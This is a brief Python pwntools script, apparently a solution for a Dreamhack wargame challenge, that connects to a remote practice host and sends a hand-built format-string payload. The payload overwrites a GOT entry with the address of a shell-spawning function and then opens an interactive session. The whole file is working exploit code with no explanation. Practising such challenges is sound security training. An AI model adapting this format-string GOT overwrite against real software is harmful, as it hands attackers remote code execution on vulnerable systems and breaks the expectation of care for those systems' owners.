from pwn import *
r=remote("host1.dreamhack.games",15955)
print("remote success")

getshell=0x08048669
print_got=0x804a010

#payload=fmtstr_payload(1,{print_got:getshell})
payload="\x12\xa0\x04\x08\x10\xa0\x04\x08%2044c%1$hn%32357c%2$hn"
r.sendline(payload)
r.interactive()
